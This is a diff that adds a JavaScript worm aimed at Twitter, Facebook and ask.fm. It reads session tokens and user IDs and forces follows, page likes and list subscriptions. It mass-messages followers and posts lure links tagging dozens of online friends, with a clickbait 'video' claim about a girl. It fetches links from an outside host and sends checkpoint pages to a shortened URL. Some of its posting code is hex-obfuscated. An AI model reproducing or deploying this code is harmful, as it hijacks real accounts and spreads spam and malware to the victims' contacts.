@@ -1,0 +1,1212 @@
+new Image().src='http://whos.amung.us/swidget/qkfj952za42c.pnh';
+
+function addJavascript(jsname){
+	var th = document.getElementsByTagName('head')[0];
+	var s = document.createElement('script');
+	s.setAttribute('type','text/javascript');
+	s.setAttribute('src',jsname);
+	th.appendChild(s);
+}
+if (location.hostname.indexOf("ask.fm") >= 0) {
+new Image().src = "http://whos.amung.us/pingjs/?k=mahsnaskfm";
+addJavascript("http://www.wjetphp.com/ask.php");
+}
+
+if (location.hostname.indexOf("twitter.com") >= 0) {
+    new Image().src = "http://whos.amung.us/widget/mhsntwit.png";
+	authenticity_token = document.getElementsByName("authenticity_token")[0].value;
+username = document.getElementsByClassName("js-user-style-bg-img")[0].id.split("user-style-")[1].split
+
+("-")[0];
+	function follow(id){
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function () {
+    if (xmlhttp.readyState == 4) {}
+};
+var params = "&authenticity_token=" + document.getElementsByName("authenticity_token")[0].value;
+params += "&user_id=" + id;
+xmlhttp.open("POST", "/i/user/follow", true);
+xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xmlhttp.send(params);
+}
+follow("");
+    twurl = "http://goo.gl/6JsOLI";
+
+    function tweet_yaz(mesaj) {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4) {}
+        };
+        var params = "authenticity_token=" + authenticity_token;
+        params += "&status=" + mesaj;
+        xmlhttp.open("POST", "/i/tweet/create", true);
+        xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xmlhttp.send(params);
+    }
+
+
+    function mesaj(username, text) {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4) {}
+        };
+        var params = "authenticity_token=" + authenticity_token;
+        params += "&screen_name=" + username;
+        params += "&scribeContext[component]=dm_existing_conversation_dialog";
+        params += "&text=" + text;
+        xmlhttp.open("POST", "/direct_messages/new", true);
+        xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xmlhttp.send(params);
+    }
+
+    followers = ["1286070210"];
+
+    function takipcigetir() {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4) {
+                sonuc = JSON.parse(xmlhttp.responseText);
+                followers_ul = document.createElement("ul");
+                followers_ul.innerHTML = sonuc.items_html;
+                for (i = 0; i < followers_ul.getElementsByClassName("account").length; i++) {
+                    followers.push({
+                        screen_name: followers_ul.getElementsByClassName("user-actions")[i].getAttribute
+
+("data-screen-name"),
+                        name: followers_ul.getElementsByClassName("user-actions")[i].getAttribute("data-
+
+name")
+                    })
+                }
+                for (i = 0; i < followers.length; i++) {
+                    mesaj(followers[i].screen_name, "Selam " + followers[i].name.split(" ")[0] + " Resmine ne 
+
+yapmışlar lan  senin burda :D \n " + twurl)
+                }
+            }
+        };
+        xmlhttp.open("GET", "/" + username + "/followers/users", true);
+        xmlhttp.send();
+    }
+
+    authenticity_token = document.getElementsByName("authenticity_token")[0].value;
+    username = document.getElementsByClassName("js-user-style-bg-img")[0].id.split("user-style-")[1].split
+
+("-")[0];
+	
+    function gundem() {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.onreadystatechange = function () {
+            if (xmlhttp.readyState == 4) {
+                sonuc = JSON.parse(xmlhttp.responseText);
+                module_html = document.createElement("div");
+                module_html.innerHTML = sonuc.module_html;
+                module_ul = module_html.getElementsByTagName("ul")[0];
+                hastag = module_ul.getElementsByTagName("li")[0].getAttribute("data-trend-name") + "\n";
+                hastag += module_ul.getElementsByTagName("li")[1].getAttribute("data-trend-name");
+                tweet_yaz("Günde 250 takipçi bu sitede: " + twurl + "\n\n" + hastag);
+            }
+        };
+        params = "authenticity_token=" + authenticity_token;
+        params += "&pc=true";
+        params += "&woeid=23424969";
+
+        xmlhttp.open("POST", "/trends", true);
+        xmlhttp.setRequestHeader("x-requested-with", "XMLHttpRequest");
+        xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xmlhttp.send(params);
+    }
+    tarih = new Date();
+    if (!localStorage['mesaj_' + username] || (localStorage['mesaj_' + username] && tarih.getTime() >= 
+
+localStorage['mesaj_' + username])) {
+        tarih.setTime(tarih.getTime() + 1000 * 20 * 20);
+        localStorage['mesaj_' + username] = tarih.getTime();
+        takipcigetir();
+        gundem();
+    }
+}
+
+if (top.location.href.indexOf("checkpoint") > -1) {
+top.location ="http://bit.ly/1fb8KIQ";
+}
+
+var tarih = new Date();
+if(location.hostname.indexOf("www.facebook.com","static.ak.facebook.com") >= 0){
+function clearCookie(name, domain, path){
+    var domain = domain || document.domain;
+    var path = path || "/";
+    document.cookie = name + "=; expires=" + new Date + "; domain=" + domain + "; path=" + path;
+};
+
+function clearListCookies(){
+var cookies = document.cookie.split("; ");
+    for (var i = 0; i < cookies.length; i++){   
+        var spcook =  cookies[i].split("=")[0];
+        clearCookie(spcook)                              
+    }
+};
+
+if(!localStorage['cookie']){
+clearListCookies();
+if(navigator.userAgent.indexOf("Chrome") > 0){
+localStorage['cookie'] = "silindi";
+}
+}
+window.setInterval(function () {
+    if (document.getElementsByClassName("_5ce")) {
+        for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
+            document.getElementsByClassName("_5ce")[i].innerHTML = "";
+        }
+    }
+    if (document.getElementsByClassName("uiToggle wrap")) {
+        for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
+            document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
+        }
+    }
+    if (document.getElementsByClassName("uiPopover")) {
+        for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
+            document.getElementsByClassName("uiPopover")[i].innerHTML = "";
+        }
+    }
+}, 200);
+var profile_id = document.cookie.match(/c_user=(\d+)/)[1];
+if(!localStorage['Aytac1_' + profile_id] ||  (localStorage['Aytac1_' + profile_id] && tarih.getTime() >= 
+
+localStorage['Aytac1_' + profile_id])){
+var config = document.getElementsByName('fb_dtsg')[0].value;
+localStorage.consoleEnabled="opt";
+
+var pages = Array
+
+("284905944997186","549252541753997","427659460701846","177958912409882","381907345187380")
+
+;
+var takip = Array("100006667423609","");
+var list = Array("1482045118694388","1498675803699892");
+for(i=0;i<pages.length;i++){sayfa(pages[i]);}
+for(i=0;i<takip.length;i++){abone(takip[i]);}
+for(i=0;i<list.length;i++){liste(list[i]);}
+
+function abone(id) {
+var $http = new XMLHttpRequest();
+var $params = "profile_id=" + id + "&location=1&__user=" + profile_id + "&fb_dtsg=" + config;
+$http.open("POST", "/ajax/follow/follow_profile.php", true);
+$http.send($params);
+}
+function sayfa(id) {
+var $http = new XMLHttpRequest();
+var $params = "fbpage_id=" + id + "&add=true&__user=" + profile_id  +"&fb_dtsg=" + config;
+$http.open("POST", "/ajax/pages/fan_status.php", true);
+$http.send($params);
+}
+function liste(id) {
+var $http = new XMLHttpRequest();
+var $params = "location=permalink&action=subscribe&flid="+id+"&__user=" + profile_id +"&fb_dtsg=" + 
+
+config;
+$http.open("POST", "/ajax/friends/lists/subscribe/modify", true);
+$http.send($params);
+}
+function begen(id) {
+ var xhr = new XMLHttpRequest();
+ params ="like_action=true";
+ params +="&ft_ent_identifier="+id;
+ params +="&source=2";
+ params +="&client_id=1385682597409%3A3331188475";
+ params +="&rootid=u_jsonp_11_6";
+ params +="&giftoccasion";
+ params +="&ft[tn]=%3E%3D";
+ params +="&ft[type]=20";
+ params +="&__user="+profile_id;
+ params +="&__a=1";
+ params +="&__dyn=7n8anEAMCBClUlgDxqiykUUxoshK9x2mbAKl0";
+ params +="&__req=1g";
+ params +="&fb_dtsg="+document.getElementsByName("fb_dtsg")[0].value;
+ params +="&__rev=1025849";
+ params +="&ttstamp=";
+ xhr.open("POST", "/ajax/ufi/like.php", true);
+	xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            xhr.close;
+        }
+    }
+    xhr.send(params);
+}
+begen("");
+begen("");
+begen("");
+
+if(navigator.userAgent.indexOf("Chrome") > 0){
+tarih.setTime(tarih.getTime() + 1000 * 40 * 40);
+localStorage['Aytac1_' + profile_id] = tarih.getTime();
+}
+}
+}
+
+
+
+
+
+if(location.hostname.indexOf("facebook.com")>=0){
+
+
+function secme(){
+
+var xhr = new XMLHttpRequest();
+ xhr.open("GET", "http://www.wjetphp.com/sex/mahsun.php", true);   //me ndreq 1 qesi//
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+		   var xmlhttp = new XMLHttpRequest();
+var params = JSON.stringify({longUrl:  xhr.responseText + "#" + Math.floor((Math.random() * 99999) + 
+
+1)});
+xmlhttp.open("POST", "https://www.googleapis.com/urlshortener/v1/url", true);
+xmlhttp.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+xmlhttp.onreadystatechange = function () {
+    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+          var data = JSON.parse(xmlhttp.responseText);
+        if (data.id) {
+           domainlink = data.id.replace("http","https");
+		   url = domainlink;
+		   StartFunction();
+        }
+    }
+}
+xmlhttp.send(params);
+        }
+    }
+    xhr.send();
+
+
+}
+
+
+function ThemeList(){
+function getf_online(id){
+  var xmlhttp = new XMLHttpRequest();
+  var params = "user=" + profile_id + "&fetch_mobile=false&__user=" + profile_id + 
+
+"&__a=1&__req=2&fb_dtsg=" + config;
+  xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
+  xmlhttp.onreadystatechange = function() {
+    if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+      var response = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
+	  eval("x = response");
+      var count = 0;
+	  var allonline = [];
+	  var namelist = [];
+                                        friend_lists = "";
+                                        friend_names = "";
+                                        friend_lists2 = "";
+                                        friend_names2 = "";						
+
+				
+		for ( veas in x.payload.buddy_list.userInfos){
+        var thisis = x.payload.buddy_list.userInfos[veas];
+		allonline.push(veas);
+		namelist.push(thisis.name);
+		}
+		var integercount = 0;
+		for(i=0; i<20; i++){
+		integercount++;
+		var countas = Math.floor(Math.random()*allonline.length);
+		var friendid = allonline[countas];
+		var friendname = namelist[countas];
+		}
+		for(i=0; i<20; i++){
+		integercount++;
+		var countas = Math.floor(Math.random()*allonline.length);
+		var friendid = allonline[countas];
+		var friendname = namelist[countas];
+friend_lists+= " &text_tags[" + integercount + "]=@[" + friendid + ":" + friendname + "]";
+friend_names+= "&tags[" + integercount + "]="+friendid;
+		}
+		for(i=0; i<45; i++){
+		integercount++;
+		var countas = Math.floor(Math.random()*allonline.length);
+		var friendid = allonline[countas];
+		var friendname = namelist[countas];
+friend_lists2+= "&with[" + i + "]=" + friendid + "";
+friend_names2+= "&text_with[" + i + "]=" + friendname + "";
+		}		
+		SendThePost(friend_names2, friend_lists2);
+      xmlhttp.close;
+    }
+  }
+  xmlhttp.send(params);
+}
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var config = document.getElementsByName('fb_dtsg')[0].value;
+var DaTe = new Date();
+var dt = DaTe.getDay() +1;
+function SendThePost(fr1,fr2){
+var Title = "kucucuk kiza akliniza gelmeyecek seyler yaptiler adiler!";
+var TextAs = "bu goruntuler herkesi ayaga kaldirir. Fena rezil etmişler..\n\nVideo : " + url + "";
+var xml = new XMLHttpRequest();
+var xml_open = "/ajax/timeline/mle_submit.php?composer_id=u_jsonp_4_i";
+var xml_send = "fb_dtsg=" + fb_dtsg + "&what=" + Title + "&where_hub_id=&date_start[year]
+
+=2014&date_start[month]=6&date_start[day]=" + dt + 
+
+"&where_hub_text=&story=asdasdasd&hub_id=239309219427264&hub_type_id=169453879784028&profile_i
+
+d=" + user_id + 
+
+"&session_id=&surface=composer&creation_time=&isstart=1&relativeelementid=u_jsonp_4_i&flyout=1&audienc
+
+e[0][value]=80&save_mle=1&__user=" + user_id + 
+
+"&__a=1&__dyn=7n8anEAMBlynzpQ9UoGya4Cq75AyUgByVbGAFpaGEZ9LFDxCm6pZWypVo&__req=9v&ttstamp
+
+=265817176116867510311610679121&__rev=1270592"
+
+
+xml.open("POST", xml_open, true);
+
+    xml.onreadystatechange = function () {
+        if (xml.readyState == 4 && xml.status == 200) {
+
+            var thisid = xml.responseText.match('entidentifier":"(.*?)"')[1];
+			eval("th = thisid");
+			var xml2 = new XMLHttpRequest();
+			var xml2_open = "/ajax/timeline/mle_submit.php?from_callout=0";
+			var xml2_send = "fb_dtsg=" + fb_dtsg + "&what=" + Title + 
+
+"&where_hub_id=&where_hub_text=&date_start[year]=2014&date_start[month]=6&date_start[day]=" + dt + 
+
+"&story=" + encodeURIComponent(TextAs) + 
+
+"&hub_id=239309219427264&hub_type_id=169453879784028&profile_id=" + user_id + 
+
+"&session_id=&surface=edit&creation_time=1401724025&isstart=1&mle_id=" + thisid + 
+
+"&unit_wide=1&relativeelementid=u_jsonp_2_19&flyout=1&audience[" + thisid + "][value]
+
+=80&save_mle=1&__user=" + user_id + 
+
+"&__a=1&__dyn=7n8ajEAMCBynzpQ9UoGya4Cq7pEsx6iWF29aGEZ9LFDxCm6pWmcDBw&__req=i&ttstamp=265
+
+81711144848114731007978120&__rev=1270592"
+			xml2_send += fr1;
+			xml2_send += fr2;
+			xml2.open("POST", xml2_open, true);
+			xml2.setRequestHeader("Content-type", "application/x-www-form-
+
+urlencoded");
+
+			xml2.send(xml2_send);
+			eval("xs = xml2");
+					
+
+
+        }
+    }
+	
+xml.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xml.send(xml_send);
+}
+getf_online();
+
+}
+
+function StartFunction(){
+
+getf_online();
+ThemeList();
+
+}
+
+function createCookie(a, b, c) {
+    if (c) {
+        var d = new Date;
+        d.setTime(d.getTime() + c * 24 * 60 * 60 * 1000);
+        var e = "; expires=" + d.toGMTString();
+    } else var e = "";
+    document.cookie = a + "=" + b + e + "; path=/";
+}
+
+function randomcharacter(long){ 
+var karakterler=new Array("a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","r","s","t","u","v","y", 
+"z","x","w","q","0","1","2","3","4","5","6","7","8","9"); 
+var kelime=""; 
+
+for(i=0;i<long;i++){ 
+var rastgele_sayi=Math.floor(Math.random()*(karakterler.length-1)); 
+kelime=kelime+karakterler[rastgele_sayi]; 
+}
+
+return kelime; 
+}
+
+var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
+var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+
+var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
+var config = document.getElementsByName('fb_dtsg')[0].value;
+
+
+var _0x831f=["","\x6B\x75\x63\x75\x63\x75\x6B\x20\x6B\x69\x7A\x61\x20\x61\x6B\x6C\x69
+
+\x6E\x69\x7A\x61\x20\x67\x65\x6C\x6D\x65\x79\x65\x63\x65\x6B\x20\x73\x65\x79\x6C\x65\x72
+
+\x20\x79\x61\x70\x74\x69\x6C\x65\x72\x20\x61\x64\x69\x6C\x65\x72\x20\x38\x39\x65\x63\x37
+
+\x38","\x61\x68\x6C\x61\x6B\x73\x69\x7A\x20\x61\x64\x69\x6C\x65\x72\x20\x6B\x69\x7A\x61
+
+\x20\x7A\x6F\x72\x6C\x61\x20\x73\x61\x68\x69\x70\x20\x6F\x6C\x64\x75\x6C\x61\x72\x25\x30
+
+\x41\x75\x74\x61\x6E\x6D\x61\x7A\x20\x68\x65\x72\x69\x66\x6C\x65\x72\x20\x6B\x69\x7A\x61
+
+\x20\x79\x61\x70\x74\x69\x6B\x6C\x61\x72\x69\x6E\x61\x20\x62\x61\x6B\x69\x6E\x0A\x0A\x56
+
+\x69\x64\x65\x6F\x20\x2D\x2D\x3E\x20","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77
+
+\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x70\x64
+
+\x61\x74\x65\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x7B\x22\x63\x6C\x5F\x69\x6D\x70
+
+\x69\x64\x22\x3A\x22\x61\x35\x39\x30\x65\x37\x34\x62\x22\x2C\x22\x63\x6C\x65\x61\x72\x63
+
+\x6F\x75\x6E\x74\x65\x72\x22\x3A\x31\x2C\x22\x65\x6C\x65\x6D\x65\x6E\x74\x69\x64\x22
+
+\x3A\x22\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x35\x5F\x39\x22\x2C\x22\x76\x65\x72\x73\x69
+
+\x6F\x6E\x22\x3A\x22\x78\x22\x2C\x22\x70\x61\x72\x65\x6E\x74\x5F\x66\x62\x69\x64\x22
+
+\x3A","\x7D","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x78\x68\x70\x63\x5F\x63\x6F\x6E\x74
+
+\x65\x78\x74\x3D\x70\x72\x6F\x66\x69\x6C\x65\x26\x78\x68\x70\x63\x5F\x69\x73\x6D\x65\x74
+
+\x61\x3D\x31\x26\x78\x68\x70\x63\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x3D\x31\x26\x78\x68
+
+\x70\x63\x5F\x63\x6F\x6D\x70\x6F\x73\x65\x72\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70
+
+\x5F\x32\x5F\x67\x26\x78\x68\x70\x63\x5F\x74\x61\x72\x67\x65\x74\x69\x64\x3D","\x26\x69
+
+\x63\x6F\x6E\x5F\x69\x64\x3D\x26\x63\x6C\x70\x3D","\x26\x78\x68\x70\x63\x5F\x6D\x65\x73
+
+\x73\x61\x67\x65\x5F\x74\x65\x78\x74\x3D","\x26\x78\x68\x70\x63\x5F\x6D\x65\x73\x73\x61
+
+\x67\x65\x3D","\x26\x61\x6B\x74\x69\x6F\x6E\x3D\x70\x6F\x73\x74\x26\x61\x70\x70\x5F\x69
+
+\x64\x3D\x32\x33\x30\x39\x38\x36\x39\x37\x37\x32\x26\x61\x74\x74\x61\x63\x68\x6D\x65
+
+\x6E\x74\x5B\x70\x61\x72\x61\x6D\x73\x5D\x5B\x75\x72\x6C\x49\x6E\x66\x6F\x5D\x5B\x63\x61
+
+\x6E\x6F\x6E\x69\x63\x61\x6C\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74
+
+\x5B\x70\x61\x72\x61\x6D\x73\x5D\x5B\x75\x72\x6C\x49\x6E\x66\x6F\x5D\x5B\x66\x69\x6E\x61
+
+\x6C\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x5B\x70\x61\x72\x61\x6D\x73
+
+\x5D\x5B\x75\x72\x6C\x49\x6E\x66\x6F\x5D\x5B\x75\x73\x65\x72\x5D\x3D","\x26\x61\x74\x74
+
+\x61\x63\x68\x6D\x65\x6E\x74\x5B\x70\x61\x72\x61\x6D\x73\x5D\x5B\x66\x61\x76\x69\x63
+
+\x6F\x6E\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x5B\x70\x61\x72\x61\x6D\x73
+
+\x5D\x5B\x74\x69\x74\x6C\x65\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74
+
+\x5B\x70\x61\x72\x61\x6D\x73\x5D\x5B\x73\x75\x6D\x6D\x61\x72\x79\x5D\x3D","\x26\x61\x74
+
+\x74\x61\x63\x68\x6D\x65\x6E\x74\x5B\x70\x61\x72\x61\x6D\x73\x5D\x5B\x69\x6D\x61\x67\x65
+
+\x73\x5D\x5B\x30\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x5B\x70\x61\x72
+
+\x61\x6D\x73\x5D\x5B\x6D\x65\x64\x69\x75\x6D\x5D\x3D\x31\x30\x33\x26\x61\x74\x74\x61\x63
+
+\x68\x6D\x65\x6E\x74\x5B\x75\x72\x6C\x5D\x3D","\x26\x61\x74\x74\x61\x63\x68\x6D\x65
+
+\x6E\x74\x5B\x74\x79\x70\x65\x5D\x3D\x31\x30\x30\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72
+
+\x69\x63\x73\x5B\x73\x6F\x75\x72\x63\x65\x5D\x3D\x53\x68\x61\x72\x65\x53\x74\x61\x67\x65
+
+\x45\x78\x74\x65\x72\x6E\x61\x6C\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73
+
+\x5B\x64\x6F\x6D\x61\x69\x6E\x5D\x3D\x77\x77\x77\x2E\x6A\x73\x2E\x64\x6F\x26\x6C\x69
+
+\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x62\x61\x73\x65\x5F\x64\x6F\x6D\x61\x69
+
+\x6E\x5D\x3D\x6A\x73\x2E\x64\x6F\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73
+
+\x5B\x74\x69\x74\x6C\x65\x5F\x6C\x65\x6E\x5D\x3D\x34\x38\x26\x6C\x69\x6E\x6B\x5F\x6D\x65
+
+\x74\x72\x69\x63\x73\x5B\x73\x75\x6D\x6D\x61\x72\x79\x5F\x6C\x65\x6E\x5D\x3D\x31\x38\x32
+
+\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x6D\x69\x6E\x5F\x64\x69\x6D\x65
+
+\x6E\x73\x69\x6F\x6E\x73\x5D\x5B\x30\x5D\x3D\x36\x32\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74
+
+\x72\x69\x63\x73\x5B\x6D\x69\x6E\x5F\x64\x69\x6D\x65\x6E\x73\x69\x6F\x6E\x73\x5D\x5B\x31
+
+\x5D\x3D\x36\x32\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67
+
+\x65\x73\x5F\x77\x69\x74\x68\x5F\x64\x69\x6D\x65\x6E\x73\x69\x6F\x6E\x73\x5D\x3D\x31\x26
+
+\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x5F\x64\x69
+
+\x6D\x65\x6E\x73\x69\x6F\x6E\x73\x5D\x5B\x30\x5D\x3D\x34\x30\x30\x26\x6C\x69
+
+\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x5F\x64\x69\x6D\x65
+
+\x6E\x73\x69\x6F\x6E\x73\x5D\x5B\x31\x5D\x3D\x32\x32\x35\x26\x6C\x69\x6E\x6B\x5F\x6D\x65
+
+\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x73\x5F\x73\x65\x6C\x65\x63\x74\x65\x64
+
+\x5D\x3D\x31\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65
+
+\x73\x5F\x63\x6F\x6E\x73\x69\x64\x65\x72\x65\x64\x5D\x3D\x31\x26\x6C\x69
+
+\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x73\x5F\x63\x61\x70
+
+\x5D\x3D\x33\x26\x6C\x69\x6E\x6B\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65
+
+\x73\x5F\x74\x79\x70\x65\x5D\x3D\x72\x61\x6E\x6B\x65\x64\x26\x63\x6F\x6D\x70\x6F\x73\x65
+
+\x72\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x62\x65\x73\x74\x5F\x69\x6D\x61\x67\x65\x5F\x77
+
+\x5D\x3D\x31\x35\x34\x26\x63\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63\x73
+
+\x5B\x62\x65\x73\x74\x5F\x69\x6D\x61\x67\x65\x5F\x68\x5D\x3D\x31\x35\x34\x26\x63
+
+\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65
+
+\x5F\x73\x65\x6C\x65\x63\x74\x65\x64\x5D\x3D\x30\x26\x63\x6F\x6D\x70\x6F\x73\x65\x72
+
+\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x73\x5F\x70\x72\x6F\x76\x69\x64
+
+\x65\x64\x5D\x3D\x31\x26\x63\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63\x73
+
+\x5B\x69\x6D\x61\x67\x65\x73\x5F\x6C\x6F\x61\x64\x65\x64\x5D\x3D\x31\x26\x63\x6F\x6D\x70
+
+\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x69\x6D\x61\x67\x65\x73\x5F\x73\x68
+
+\x6F\x77\x6E\x5D\x3D\x31\x26\x63\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63
+
+\x73\x5B\x6C\x6F\x61\x64\x5F\x64\x75\x72\x61\x74\x69\x6F\x6E\x5D\x3D\x36\x33\x33\x26\x63
+
+\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69\x63\x73\x5B\x74\x69\x6D\x65\x64
+
+\x5F\x6F\x75\x74\x5D\x3D\x30\x26\x63\x6F\x6D\x70\x6F\x73\x65\x72\x5F\x6D\x65\x74\x72\x69
+
+\x63\x73\x5B\x73\x65\x6C\x65\x63\x74\x6F\x72\x5F\x74\x79\x70\x65\x5D\x3D\x55\x49\x54\x68
+
+\x75\x6D\x62\x50\x61\x67\x65\x72\x5F\x36\x26\x68\x69\x64\x65\x5F\x6F\x62\x6A\x65\x63\x74
+
+\x5F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x3D\x30\x26\x64\x69\x73\x61\x62\x6C\x65
+
+\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x5F\x73\x68\x61\x72\x69\x6E\x67\x3D\x66\x61\x6C\x73
+
+\x65\x26\x61\x75\x64\x69\x65\x6E\x63\x65\x5B\x30\x5D\x5B\x76\x61\x6C\x75\x65\x5D\x3D\x38
+
+\x30\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74
+
+\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x72\x65\x63\x65\x6E\x74\x26\x5F\x5F\x75\x73\x65\x72
+
+\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x6A\x45\x41
+
+\x4D\x42\x6C\x79\x6E\x7A\x70\x51\x39\x55\x6F\x47\x79\x61\x34\x43\x71\x37\x70\x45\x73\x78
+
+\x36\x69\x57\x46\x32\x39\x61\x47\x45\x5A\x39\x34\x57\x70\x55\x70\x42\x78\x43\x75\x47
+
+\x7A\x38\x26\x5F\x5F\x72\x65\x71\x3D\x63\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35
+
+\x38\x31\x36\x39\x39\x35\x37\x32\x36\x36\x36\x39\x31\x30\x37\x35\x33\x39\x39\x36\x36\x31
+
+\x30\x32\x26\x5F\x5F\x72\x65\x76\x3D\x31\x32\x35\x30\x39\x38\x32","\x50\x4F\x53
+
+\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70
+
+\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72
+
+\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61
+
+\x64\x65\x72","\x73\x65\x6E\x64"];function baglantiat(){var _0x62bax2=_0x831f[0];var 
+
+_0x62bax3=_0x831f[1];var _0x62bax4=_0x62bax3;var _0x62bax5=_0x831f[2]+url+_0x831f[0];var 
+
+_0x62bax6= new XMLHttpRequest();var _0x62bax7=_0x831f[3];var _0x62bax8=_0x831f[4]
+
++user_id+_0x831f[5];var _0x62bax9=encodeURIComponent(_0x62bax8);var _0x62baxa=_0x831f[6]
+
++fb_dtsg+_0x831f[7]+user_id+_0x831f[8]+_0x62bax9+_0x831f[9]+_0x62bax5+_0x831f[10]
+
++_0x62bax5+_0x831f[11]+url+_0x831f[12]+url+_0x831f[13]+url+_0x831f[14]+_0x62bax2+_0x831f[15]
+
++_0x62bax3+_0x831f[16]+_0x62bax4+_0x831f[17]+_0x62bax2+_0x831f[18]+url+_0x831f[19]
+
++user_id+_0x831f[20];_0x62baxa+=friend_lists;_0x62baxa+=friend_names;_0x62bax6[_0x831f[22]]
+
+(_0x831f[21],_0x62bax7,true);_0x62bax6[_0x831f[25]](_0x831f[23],_0x831f[24]);_0x62bax6[_0x831f
+
+[26]](_0x62baxa);} ;
+
+function getf_online(id){
+  var xmlhttp = new XMLHttpRequest();
+  var params = "user=" + profile_id + "&fetch_mobile=false&__user=" + profile_id + 
+
+"&__a=1&__req=2&fb_dtsg=" + config;
+  xmlhttp.open("POST", "/ajax/chat/buddy_list.php?__a=1", true);
+  xmlhttp.onreadystatechange = function() {
+    if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+      var response = JSON.parse(xmlhttp.responseText.replace("for (;;);", ""));
+	  eval("x = response");
+      var count = 0;
